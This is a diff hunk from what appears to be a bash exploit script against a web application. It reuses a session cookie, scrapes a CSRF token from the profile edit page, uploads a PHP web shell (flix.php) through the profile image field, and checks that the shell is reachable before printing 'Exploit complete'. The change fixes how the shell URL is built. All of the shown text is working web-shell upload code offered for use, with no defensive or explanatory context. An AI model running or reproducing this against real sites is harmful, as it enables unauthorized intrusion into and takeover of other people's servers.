@@ -30,7 +30,7 @@ fi
             eat_cookie=$(cat .eat_cookie.txt | grep "PHPSESSID" | cut -d " " -f 2 | cut -d ";" -f 1)
             eat_token=$(curl -s -k -H "Cookie: $eat_cookie" $site/profile/edit.html | grep "profile\[_token\]" | grep -oP '(?<=value=")[^"]*')
             upload_shell=$(curl -s -X POST -F "profile[file]=@flix.php" -F "profile[name]=$random_words@own.com" -F "profile[save]=" -F "profile[_token]=$eat_token" -H "Cookie: $eat_cookie" $site/profile/edit.html | grep -a "background-image:" | cut -d "'" -f 2)
-            get_shell=$(echo $(dirname $site)$upload_shell)
+            get_shell=$(echo "$site/$upload_shell")
             check_shell=$(curl -s -k -o /dev/null -w "%{http_code}" $get_shell)
                 if [[ $check_shell == "200" ]]; then
                     echo -e " [+] Exploit complete, ${GREEN}$get_shell${RESAT}"
